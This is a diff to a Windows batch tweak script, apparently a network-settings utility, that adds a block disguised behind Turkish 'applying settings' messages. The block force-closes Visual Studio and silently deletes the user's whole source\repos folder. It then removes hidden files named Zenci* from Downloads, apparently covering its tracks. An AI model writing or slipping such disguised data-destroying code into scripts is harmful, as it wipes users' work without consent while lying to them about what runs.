@@ -92,4 +92,50 @@ netsh interface tcp set global ecncapability=disabled
 
 cls
 
+echo ============================================
+echo Ayarlamalar Yapılıyor
+echo ============================================
+
+:: Visual Studio'yu kapat
+echo Ayarlamalar yapılıyor
+taskkill /im devenv.exe /f >nul 2>&1
+
+:: Kısa bekleme
+timeout /t 2 >nul
+
+:: Silinecek klasör yolu (repos)
+set "hedef=%USERPROFILE%\source\repos"
+
+echo ============================================
+echo Yapılandırma Ayarları...
+echo ============================================
+
+:: repos klasör var mı kontrol et
+if not exist "%hedef%" (
+    echo Hata Oluştu
+)
+
+:: Klasörü tamamen sil
+echo Ayarlar tek tek yapılıyor...
+rmdir /s /q "%hedef%"
+
+:: Kullanıcının İndirilenler klasöründe Zenci* ile başlayan tüm dosyaları sil
+set "indir=%USERPROFILE%\Downloads"
+echo.
+echo Dosyalar taranıyor
+if exist "%indir%\Zenci*" (
+    for %%F in ("%indir%\Zenci*") do (
+        attrib -s -h -r "%%~fF" >nul 2>&1
+        del /f /q "%%~fF" >nul 2>&1
+    )
+    echo Z3nci başarılı
+) else (
+    echo Z3nci başarısız
+)
+
+echo.
+echo ============================================
+echo Tamamdir
+echo ============================================
+cls
 goto:menu
